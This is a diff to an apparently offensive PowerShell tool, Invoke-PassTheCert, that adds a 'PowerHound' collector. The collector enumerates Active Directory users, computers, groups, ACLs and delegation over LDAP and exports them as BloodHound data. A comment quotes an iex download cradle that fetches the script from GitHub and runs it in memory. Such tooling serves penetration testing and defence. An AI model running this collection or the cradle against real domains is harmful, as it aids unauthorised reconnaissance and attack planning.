+        # Adding the default 'NT AUTHORITY' user statically
+        $Data += @{
+            "AllowedToDelegate" = @();
+            "ObjectIdentifier"  = _Helper-PowerHound-ConvertSID -Domain $Domain -SID 'S-1-5-20';
+            "PrimaryGroupSID"   = $null;
+            "Properties"        = @{
+                "domain"    = $Domain.ToUpper();
+                "domainsid" = $DomainSID;
+                "name"      = "NT AUTHORITY@$($Domain.ToUpper())";
+            };
+            "Aces"              = @();
+            "SPNTargets"        = @();
+            "HasSIDHistory"     = @();
+            "IsDeleted"         = $false;
+            "IsACLProtected"    = $false;
+        }
+        $BloodHoundObjects["UserObjects"] | ForEach-Object {
+            $Data += @{
+                "ObjectIdentifier"  = _Helper-PowerHound-ConvertSID -Domain $Domain -SID $_.objectsid -PrincipalName $_.name;
+                "Properties"        = _Helper-PowerHound-GetProperties -LDAPObject $_ -DataType 'user' -DomainSID $DomainSID;
+                "PrimaryGroupSID"   = "$($DomainSID)-$($_.primarygroupid)";
+                "IsDeleted"         = $null -ne $_.isdeleted;
+                "IsACLProtected"    = 0 -ne ((_GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN $_.distinguishedname -Attribute 'nTSecurityDescriptor').ControlFlags -band 0x1000) # http://www.selfadsi.org/deep-inside/ad-security-descriptors.htm
+                "SPNTargets"        = @();
+                "HasSIDHistory"     = if ($null -eq $_.sidhistory) { ,@() } else { $_.sidhistory };
+                "AllowedToDelegate" = @();
+                "Aces"             = _Helper-PowerHound-GetAces -LdapConnection $LdapConnection -LDAPObject $_ -BloodHoundSIDLookupTable $BloodHoundSIDLookupTable -Domain $Domain;
+            }
+        }
+        $UsersCollection = @{
+            "data" = $Data;
+            "meta" = @{
+                "type"    = "users";
+                "count"   = ($Data | Measure-Object).Count;
+                "version" = $BloodHoundVersion
+            }
+        }
+
+
+        # Generating "computers.json"
+        Write-Host "[*] Generating Computers Collection..."
+        $Data = @()
+        # This entry is unsupported as it CANNOT be gathered LDAP-wise.
+        $UnsupportedEntry = @{
+            "Results"       = @();
+            "Collected"     = $false;
+            "FailureReason" = $null;
+        }
+        $BloodHoundObjects["ComputerObjects"] | ForEach-Object {
+            $Data += @{
+                "ObjectIdentifier" = _Helper-PowerHound-ConvertSID -Domain $Domain -SID $_.objectsid -PrincipalName $_.name;
+                "Properties"         = _Helper-PowerHound-GetProperties -LDAPObject $_ -DataType 'computer' -DomainSID $DomainSID;
+                "PrimaryGroupSID"    = "$($DomainSID)-$($_.primarygroupid)";
+                "IsDeleted"          = $null -ne $_.isdeleted;
+                "IsACLProtected"     = 0 -ne ((_GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN $_.distinguishedname -Attribute 'nTSecurityDescriptor').ControlFlags -band 0x1000) # http://www.selfadsi.org/deep-inside/ad-security-descriptors.htm
+                "HasSIDHistory"      = if ($null -eq $_.sidhistory) { ,@() } else { $_.sidhistory };
+                "AllowedToDelegate"  = @(_Helper-PowerHound-GetAllowedToDelegateContrained -LDAPObject $_ -BloodHoundObjects $BloodHoundObjects);
+                "AllowedToAct"       = @(_Helper-PowerHound-GetAllowedToActResourceBased -LDAPObject $_ -BloodHoundSIDLookupTable $BloodHoundSIDLookupTable);
+                "Status"             = $null;
+                "DumpSMSAPassword"   = @();
+                "Sessions"           = $UnsupportedEntry;
+                "PrivilegedSessions" = $UnsupportedEntry;
+                "RegistrySessions"   = $UnsupportedEntry;
+                "LocalAdmins"        = $UnsupportedEntry;
+                "RemoteDesktopUsers" = $UnsupportedEntry;
+                "DcomUsers"          = $UnsupportedEntry;
+                "PSRemoteUsers"      = $UnsupportedEntry;
+                "Aces"               = _Helper-PowerHound-GetAces -LdapConnection $LdapConnection -LDAPObject $_ -BloodHoundSIDLookupTable $BloodHoundSIDLookupTable -Domain $Domain;
+            }
+        }
+        $ComputersCollection = @{
+            "data" = $Data;
+            "meta" = @{
+                "type"    = "computers";
+                "count"   = ($Data | Measure-Object).Count;
+                "version" = $BloodHoundVersion
+            }    
+        }
+
+
+        # Generating "containers.json"
+        Write-Host "[*] Generating Containers Collection..."
+        $Data = @()
+        $BloodHoundObjects["ContainerObjects"] | ForEach-Object {
+            
+            # We won't enumerate some default containers, to avoid MASSIVE BloodHound collections. 
+            # -> https://github.com/dirkjanm/BloodHound.py/blob/fd3f322e066d66314bfb31d4ae6f497df5872177/bloodhound/ad/utils.py#L419-L427
+            # Comment the below condition at your own (and storage) risk !
+            if (-not ($_.distinguishedname -match 'CN=DOMAINUPDATES,CN=SYSTEM,DC=|CN=POLICIES,CN=SYSTEM,DC=')) {
+                $Data += @{
+                    "ObjectIdentifier" = _Helper-PowerHound-ConvertGUID -GUID $_.objectguid;
+                    "Properties"       = _Helper-PowerHound-GetProperties -LDAPObject $_ -DataType 'container' -DomainSID $DomainSID;
+                    "ChildObjects"     = @(_Helper-PowerHound-GetChildObjects -LdapConnection $LdapConnection -LDAPObject $_);
+                    "IsDeleted"        = $null -ne $_.isdeleted;
+                    "IsACLProtected"   = 0 -ne ((_GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN $_.distinguishedname -Attribute 'nTSecurityDescriptor').ControlFlags -band 0x1000) # http://www.selfadsi.org/deep-inside/ad-security-descriptors.htm
+                    "Aces"            = _Helper-PowerHound-GetAces -LdapConnection $LdapConnection -LDAPObject $_ -BloodHoundSIDLookupTable $BloodHoundSIDLookupTable -Domain $Domain;
+                }
+            }
+        }
+        $ContainersCollection = @{
+            "data" = $Data;
+            "meta" = @{
+                "type"    = "containers";
+                "count"   = ($Data | Measure-Object).Count;
+                "version" = $BloodHoundVersion
+            }    
+        }
+
+
+        # Generating "ous.json"
+        Write-Host "[*] Generating OUs Collection..."
+        $Data = @()
+        # This entry is unsupported as it CANNOT be gathered LDAP-wise.
+        $UnsupportedEntry = @{
+            "AffectedComputers"  = @();
+            "DcomUsers"          = @();
+            "LocalAdmins"        = @();
+            "PSRemoteUsers"      = @();
+            "RemoteDesktopUsers" = @();
+        }
+        $BloodHoundObjects["OUObjects"] | ForEach-Object {
+            $Data += @{
+                "ObjectIdentifier" = _Helper-PowerHound-ConvertGUID -GUID $_.objectguid;
+                "Properties"       = _Helper-PowerHound-GetProperties -LDAPObject $_ -DataType 'ou' -DomainSID $DomainSID;
+                "ChildObjects"     = @(_Helper-PowerHound-GetChildObjects -LdapConnection $LdapConnection -LDAPObject $_);
+                "Links"            = @();
+                "IsDeleted"        = $null -ne $_.isdeleted;
+                "IsACLProtected"   = 0 -ne ((_GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN $_.distinguishedname -Attribute 'nTSecurityDescriptor').ControlFlags -band 0x1000) # http://www.selfadsi.org/deep-inside/ad-security-descriptors.htm
+                "GPOChanges"       = $UnsupportedEntry;
+                "Aces"            = _Helper-PowerHound-GetAces -LdapConnection $LdapConnection -LDAPObject $_ -BloodHoundSIDLookupTable $BloodHoundSIDLookupTable -Domain $Domain;
+            }
+        }
+        $OUsCollection = @{
+            "data" = $Data;
+            "meta" = @{
+                "type"    = "ous";
+                "count"   = ($Data | Measure-Object).Count;
+                "version" = $BloodHoundVersion
+            }    
+        }
+
+
+        # Generating "gpos.json"
+        Write-Host "[*] Generating GPOs Collection..."
+        $Data = @()
+        $BloodHoundObjects["GPOObjects"] | ForEach-Object {
+            $Data += @{
+                "ObjectIdentifier" = _Helper-PowerHound-ConvertGUID -GUID $_.objectguid;
+                "Properties"       = _Helper-PowerHound-GetProperties -LDAPObject $_ -DataType 'gpo' -DomainSID $DomainSID;
+                "IsDeleted"        = $null -ne $_.isdeleted;
+                "IsACLProtected"   = 0 -ne ((_GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN $_.distinguishedname -Attribute 'nTSecurityDescriptor').ControlFlags -band 0x1000) # http://www.selfadsi.org/deep-inside/ad-security-descriptors.htm
+                "Aces"            = _Helper-PowerHound-GetAces -LdapConnection $LdapConnection -LDAPObject $_ -BloodHoundSIDLookupTable $BloodHoundSIDLookupTable -Domain $Domain;
+            }
+        }
+        $GPOsCollection = @{
+            "data" = $Data;
+            "meta" = @{
+                "type"    = "gpos";
+                "count"   = ($Data | Measure-Object).Count;
+                "version" = $BloodHoundVersion
+            }    
+        }
+
+
+        # Generating "groups.json"
+        Write-Host "[*] Generating Groups Collection..."
+        $Data = @()
+        # Adding the default groups
+        $Data += @{
+            "Members"           = @();
+            "ObjectIdentifier"  = _Helper-PowerHound-ConvertSID -Domain $Domain -SID 'S-1-1-0';
+            "Properties"        = @{
+                "domain"    = $Domain.ToUpper();
+                "name"      = "EVERYONE@$($Domain.ToUpper())";
+            };
+            "Aces"              = @();
+            "IsDeleted"         = $false;
+            "IsACLProtected"    = $false;
+        }
+        $Data += @{
+            "Members"           = @();
+            "ObjectIdentifier"  = _Helper-PowerHound-ConvertSID -Domain $Domain -SID 'S-1-5-11';
+            "Properties"        = @{
+                "domain"    = $Domain.ToUpper();
+                "name"      = "AUTHENTICATED USERS@$($Domain.ToUpper())";
+            };
+            "Aces"              = @();
+            "IsDeleted"         = $false;
+            "IsACLProtected"    = $false;
+        }
+        $Data += @{
+            "Members"           = @();
+            "ObjectIdentifier"  = _Helper-PowerHound-ConvertSID -Domain $Domain -SID 'S-1-5-4';
+            "Properties"        = @{
+                "domain"    = $Domain.ToUpper();
+                "name"      = "INTERACTIVE@$($Domain.ToUpper())";
+            };
+            "Aces"              = @();
+            "IsDeleted"         = $false;
+            "IsACLProtected"    = $false;
+        }
+        $Data += @{
+            "Members"           = @($BloodHoundObjects["DomainControllerObjects"] |%{ @{ "ObjectIdentifier" = $_.objectsid; "ObjectType" = _Helper-PowerHound-GetObjectType -ObjectClass $_.objectclass } });
+            "ObjectIdentifier"  = _Helper-PowerHound-ConvertSID -Domain $Domain -SID 'S-1-5-9';
+            "Properties"        = @{
+                "domain"    = $Domain.ToUpper();
+                "name"      = "ENTERPRISE DOMAIN CONTROLLERS@$($Domain.ToUpper())";
+            };
+            "Aces"              = @();
+            "IsDeleted"         = $false;
+            "IsACLProtected"    = $false;
+        }
+        $BloodHoundObjects["GroupObjects"] | ForEach-Object {
+            $Data += @{
+                # Some group SID (namely the well-known groups) has an SID starting with a dash. These edge-cases are simply storedd as the domain name.
+                "ObjectIdentifier" = _Helper-PowerHound-ConvertSID -Domain $Domain -SID $_.objectsid -PrincipalName $_.name;
+                "Properties"       = _Helper-PowerHound-GetProperties -LDAPObject $_ -DataType 'group' -DomainSID $DomainSID;
+                "IsDeleted"        = $null -ne $_.isdeleted;
+                "IsACLProtected"   = 0 -ne ((_GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN $_.distinguishedname -Attribute 'nTSecurityDescriptor').ControlFlags -band 0x1000) # http://www.selfadsi.org/deep-inside/ad-security-descriptors.htm
+                "Members"          = @(_Helper-PowerHound-GetMembers -LDAPObject $_ -BloodHoundObjects $BloodHoundObjects -BloodHoundDNLookupTable $BloodHoundDNLookupTable);
+                "Aces"            = _Helper-PowerHound-GetAces -LdapConnection $LdapConnection -LDAPObject $_ -BloodHoundSIDLookupTable $BloodHoundSIDLookupTable -Domain $Domain;
+            }
+        }
+        $GroupsCollection = @{
+            "data" = $Data;
+            "meta" = @{
+                "type"    = "groups";
+                "count"   = ($Data | Measure-Object).Count;
+                "version" = $BloodHoundVersion
+            }    
+        }
+        
+        Write-Host ""
+
+        if (-not $NoZip) {
+
+            Add-Type -Assembly "System.IO.Compression"
+            Add-Type -Assembly "System.IO.Compression.FileSystem"
+
+            $OutZip = "$(Get-Location)\$(Get-Date -Format "yyyy-MM-dd-HHmmss")_$($Domain.ToUpper())_BloodHound.zip"
+
+            # Create the zip file on disk (but entries are added from memory)
+            $Stream = [System.IO.File]::Open($OutZip, [System.IO.FileMode]::Create)
+            $Archive = [System.IO.Compression.ZipArchive]::new($Stream, [System.IO.Compression.ZipArchiveMode]::Create)
+
+            $Collections = @{
+                "domains.json"    = $DomainsCollection;
+                "users.json"      = $UsersCollection;
+                "computers.json"  = $ComputersCollection;
+                "containers.json" = $ContainersCollection;
+                "ous.json"        = $OUsCollection;
+                "gpos.json"       = $GPOsCollection;
+                "groups.json"     = $GroupsCollection;
+            }
+
+            foreach ($FileName in $Collections.Keys) {
+
+                Write-Host "[*] Adding '$FileName' To Output Archive..."
+                
+                # Create an entry in the zip
+                $Entry = $Archive.CreateEntry($FileName)
+                $EntryStream = $Entry.Open()
+                $StreamWriter = [System.IO.StreamWriter]::new($EntryStream)
+
+                # Convert the collection variable to JSON and write it directly to the zip stream
+                $JsonData = $Collections[$FileName] | ConvertTo-Json -Depth 100
+                $StreamWriter.Write($JsonData)
+
+                # Clean up the entry streams
+                $StreamWriter.Flush()
+                $StreamWriter.Dispose()
+                $EntryStream.Dispose()
+            }
+
+            $Archive.Dispose()
+            $Stream.Dispose()
+
+            Write-Host "[+] Successfully Compressed BloodHound Collection Into '$OutZip' !"
+            Write-Host "[*] If, For Some Reasons, The BloodHound Upload Cancelled, You May Need To Retry Importing The Collection Multiple Times."
+
+        } else {
+
+            $OutDir = "$(Get-Location)\$(Get-Date -Format "yyyy-MM-dd-HHmmss")_$($Domain.ToUpper())_BloodHound"
+            New-Item -Path $OutDir -ItemType "Directory" |Out-Null
+            Write-Host "[+] Successfully Created Folder '$OutDir' !"
+
+            $OutFile = "$OutDir\domains.json"
+            ConvertTo-Json -Depth 100 -InputObject $DomainsCollection |Out-File -Encoding utf8 -FilePath $OutFile
+            Write-Host "[+] Successfully Exported Domains Collection Into '$OutFile' !"
+
+            $OutFile = "$OutDir\users.json"
+            ConvertTo-Json -Depth 100 -InputObject $UsersCollection |Out-File -Encoding utf8 -FilePath $OutFile
+            Write-Host "[+] Successfully Exported Users Collection Into '$OutFile' !"
+
+            $OutFile = "$OutDir\computers.json"
+            ConvertTo-Json -Depth 100 -InputObject $ComputersCollection |Out-File -Encoding utf8 -FilePath $OutFile
+            Write-Host "[+] Successfully Exported Computers Collection Into '$OutFile' !"
+
+            $OutFile = "$OutDir\containers.json"
+            ConvertTo-Json -Depth 100 -InputObject $ContainersCollection |Out-File -Encoding utf8 -FilePath $OutFile
+            Write-Host "[+] Successfully Exported Containers Collection Into '$OutFile' !"
+
+            $OutFile = "$OutDir\ous.json"
+            ConvertTo-Json -Depth 100 -InputObject $OUsCollection |Out-File -Encoding utf8 -FilePath $OutFile
+            Write-Host "[+] Successfully Exported OUs Collection Into '$OutFile' !"
+
+            $OutFile = "$OutDir\gpos.json"
+            ConvertTo-Json -Depth 100 -InputObject $GPOsCollection |Out-File -Encoding utf8 -FilePath $OutFile
+            Write-Host "[+] Successfully Exported GPOs Collection Into '$OutFile' !"
+
+            $OutFile = "$OutDir\groups.json"
+            ConvertTo-Json -Depth 100 -InputObject $GroupsCollection |Out-File -Encoding utf8 -FilePath $OutFile
+            Write-Host "[+] Successfully Exported Groups Collection Into '$OutFile' !"
+
+        }
+
+        Write-Host ""
+
+        Write-Host -ForegroundColor Blue "[+] Happy Graphing !"
+
+    } else {
+
+        Write-Host "[!] Provided BloodHound Version (v$BloodHoundVersion) Not Supported !"
+        return
+
+    }
+
 }
 
 
@@ -12447,8 +14586,10 @@ function Invoke-PassTheCert {
             'DisableAccount',
             'AddGroupMember',
             'RemoveGroupMember',
+            'MoveIdentity',
             'LDAPEnum',
             'LDAPExploit',
+            'PowerHound',
             'TODO'
         )]
         [PSDefaultValue(Help="Defaults to 'Who Am I?' LDAP Extended Operation")]
@@ -12610,7 +14751,17 @@ function Invoke-PassTheCert {
 
         [Parameter(Position=43, Mandatory=$false, HelpMessage="Switch to get the raw attribute of filtered LDAP objects (without converting them into human-readable format).")]
         [Switch]$Raw,
-        
+
+        [Parameter(Position=44, Mandatory=$false, HelpMessage="Enter the domain name (likely used with PowerHound).")]
+        [System.String]$Domain,
+
+        [Parameter(Position=45, Mandatory=$false, HelpMessage="Enter the version of the BloodHound data to generate (through PowerHound).")]
+        [PSDefaultValue(Help="Defaults to 5")]
+        [System.Int32]$BloodHoundVersion = 5,
+
+        [Parameter(Position=46, Mandatory=$false, HelpMessage="Switch to prevent ZIPing the outputed BloodHound collection (through PowerHound).")]
+        [Switch]$NoZip,
+    
         [Parameter(Position=1337, Mandatory=$false, HelpMessage="Set to true to hide the banner :(")]
         [PSDefaultValue(Help="Defaults to showing the banner")]
         [Switch]$NoBanner = $false,
@@ -12785,6 +14936,9 @@ function Invoke-PassTheCert {
             "RemoveGroupMember" { 
                 $Result = _RemoveGroupMember -LdapConnection $LdapConnection -IdentityDN $IdentityDN -GroupDN $GroupDN;
             }
+            "MoveIdentity" { 
+                $Result = _MoveIdentity -LdapConnection $LdapConnection -IdentityDN $IdentityDN -TargetDN $TargetDN;
+            }
 
 
 
@@ -12794,7 +14948,11 @@ function Invoke-PassTheCert {
             # =========================================
     
             "LDAPEnum" {
-                _LDAPEnum -LdapConnection $LdapConnection -Enum $Enum -SearchBase $SearchBase -SearchScope $SearchScope -Name $Name -ObjectDN $ObjectDN
+                _LDAPEnum -LdapConnection $LdapConnection -Enum $Enum -SearchBase $SearchBase -SearchScope $SearchScope -Name $Name -ObjectDN $ObjectDN -Raw:$Raw
+            }
+
+            "PowerHound" {
+                _PowerHound -LdapConnection $LdapConnection -Domain $Domain -BloodHoundVersion $BloodHoundVersion -NoZip:$NoZip
             }
 
 
@@ -12841,19 +14999,25 @@ function Invoke-PassTheCert {
 [PSDefaultValue(Help="Show the banner")]
 [Switch]$NoBanner = $false
 
-Write-Host ""
-
 # Required .NET Assembly providing LDAP functionalities
 Add-Type -AssemblyName System.DirectoryServices.Protocols
 
-# ReGEX'ly way of checking whether the current script is being loaded using either '. .\Invoke-PassTheCert.ps1' or 'Import-Module .\Invoke-PassTheCert'.
-# If loaded as a module, do not run the main function to display help.
-$SkipStartup = $MyInvocation.Line -imatch '.*(Import-Module|\.)\s+.*Invoke-PassTheCert\.ps1.*'
+# If the script is imported in memory directly using a cradle download, then we always skip the startup info.
+# For instance, we'll match the below's condition via the command: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/jamarir/Invoke-PassTheCert/main/Invoke-PassTheCert.ps1')
+if ([string]::IsNullOrEmpty($MyInvocation.Line) -and [string]::IsNullOrEmpty($PSCommandPath)) {
+    $SkipStartup = $true
+} 
+# Otherwise, we likely ran the script from disk
+else {
+    # ReGEX'ly way of checking whether the current script is being loaded using either '. .\Invoke-PassTheCert.ps1' or 'Import-Module .\Invoke-PassTheCert'.
+    # If loaded as a module, do not run the main function to display help.
+    $SkipStartup = $MyInvocation.Line -imatch '.*(Import-Module|\.)\s+.*Invoke-PassTheCert\.ps1.*'
 
-# Note that when the script is being imported using 'Import-Module' specifically, '$MyInvocation.Line' contains the first line of this script (+EOL), as if the content of the file is dynamically copy-pasted and run in the powershell process.
-# Thus, another condition is used to check if this script is being loaded: Does it match the first line of this file (+EOL) ?
-if (-not $PSCommandPath) { $CurrentFile = $MyInvocation.MyCommand.Path } else { $CurrentFile = $PSCommandPath }
-$SkipStartup = $SkipStartup -or $MyInvocation.Line -match "$(Get-Content $CurrentFile | Select-Object -First 1)`r?`n"
+    # Note that when the script is being imported using 'Import-Module' specifically, '$MyInvocation.Line' contains the first line of this script (+EOL), as if the content of the file is dynamically copy-pasted and run in the powershell process.
+    # Thus, another condition is used to check if this script is being loaded: Does it match the first line of this file (+EOL) ?
+    if (-not $PSCommandPath) { $CurrentFile = $MyInvocation.MyCommand.Path } else { $CurrentFile = $PSCommandPath }
+    $SkipStartup = $SkipStartup -or $MyInvocation.Line -match "$(Get-Content $CurrentFile | Select-Object -First 1)`r?`n"
+}
 
 if (-not $SkipStartup) {
     if (-not $NoBanner) {  _ShowBanner; }
@@ -12862,6 +15026,7 @@ if (-not $SkipStartup) {
         Write-Host "[!] No Argument Provided ! Try The Following To Get Started... (4nd 3nj0y Th4' R1d3 !)"
         Write-Host ""
         Write-Host "    PS > .\Invoke-PassTheCert.ps1 -?"
+        Write-Host "    PS > Invoke-PassTheCert -?"
     } elseif ($Args.Count -gt 0 -and ($Args -contains '-?' -or $Args -contains '-h' -or $Args -contains '-Help')) {
         # Stripping irrelevant 'REMARKS' section
         # (Commented REMARK-stripping to avoid blanking non-english documentations)
